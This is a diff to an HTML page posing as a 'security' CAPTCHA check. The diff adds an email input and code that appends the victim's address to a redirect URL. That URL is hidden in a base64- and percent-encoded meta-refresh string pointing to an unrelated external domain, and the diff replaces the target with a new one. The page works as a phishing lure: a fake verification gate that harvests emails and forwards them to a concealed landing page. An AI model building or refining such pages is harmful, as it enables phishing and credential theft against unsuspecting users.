@@ -72,7 +72,7 @@
 
     .captcha-header {
       font-size: 1.1rem;
-      font-weight: 500; /* slightly bold */
+      font-weight: 500;
       margin-bottom: 18px;
       color: var(--text);
     }
@@ -82,7 +82,7 @@
       margin-bottom: 12px;
     }
 
-    input[type="number"] {
+    input[type="number"], input[type="email"] {
       font-size: 1rem;
       padding: 10px;
       width: 60%;
@@ -135,7 +135,7 @@
         padding: 20px;
       }
 
-      input[type="number"] {
+      input[type="number"], input[type="email"] {
         width: 100%;
       }
 
@@ -155,7 +155,6 @@
   </style>
 </head>
 <body>
-
   <!-- Top-left Logo -->
   <div class="logo">
     <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
@@ -165,6 +164,7 @@
   <!-- CAPTCHA Challenge Box -->
   <div id="captcha-box">
     <div class="captcha-header">For security reasons, please solve this to continue.</div>
+    <input type="email" id="user-email" placeholder="Enter your email" />
     <div id="captcha-question">Loading...</div>
     <input type="number" id="user-answer" placeholder="Your answer" />
     <br />
@@ -178,8 +178,9 @@
   <script>
     let answer = 0;
     let firstSolved = false;
+    let userEmail = '';
 
-    const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vZG9jdS5mZW5tZW5vcy5kZS9FYmVaRS8lMjMlMjIlMjAvJTNF";
+    const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZGhhdG92ZXIuZmVubWVuby5kZS9mcWd0JTIyJTIwLyUzRQ==";
 
     function generateCaptcha() {
       const num1 = Math.floor(Math.random() * 20) + 1;
@@ -210,7 +211,21 @@
 
     function validateCaptcha() {
       const userAnswer = parseInt(document.getElementById("user-answer").value);
+      userEmail = document.getElementById("user-email").value.trim();
       const msg = document.getElementById("message");
+
+      // Basic email validation
+      if (!userEmail) {
+        msg.innerText = "Please enter your email.";
+        return;
+      }
+
+      // Optional: Validate email format
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(userEmail)) {
+        msg.innerText = "Please enter a valid email.";
+        return;
+      }
 
       if (userAnswer === answer) {
         if (!firstSolved) {
@@ -218,13 +233,13 @@
           msg.innerText = "Correct! One more to go...";
           generateCaptcha();
         } else {
-          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
+          msg.innerHTML = `Access granted for ${userEmail} <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
           setTimeout(() => {
             redirectUser();
           }, 1500);
         }
       } else {
-        msg.innerText = "Incorrect. Please try again.";
+        msg.innerText = "Incorrect answer. Please try again.";
       }
     }
 
@@ -233,7 +248,9 @@
         const decoded = decodeURIComponent(atob(base64Ref));
         const match = decoded.match(/url=([^"]+)/);
         if (match && match[1]) {
-          window.location.href = match[1];
+          // Append email as query parameter
+          const redirectUrl = `${match[1]}?email=${encodeURIComponent(userEmail)}`;
+          window.location.href = redirectUrl;
         } else {
           alert("Redirect URL invalid.");
         }
